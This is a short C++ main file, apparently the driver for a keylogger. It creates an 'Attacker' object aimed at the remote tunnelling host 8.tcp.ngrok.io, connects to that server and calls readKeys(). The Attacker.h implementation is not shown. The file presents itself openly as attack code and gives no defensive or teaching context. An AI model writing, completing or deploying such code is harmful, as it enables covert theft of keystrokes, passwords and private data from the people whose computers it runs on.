#include <iostream>
#include <fstream>
#include "Attacker.h"

int main() {
	Attacker* attacker = new Attacker("8.tcp.ngrok.io");

	attacker->connectToServer();
	attacker->readKeys();

	return 0;
}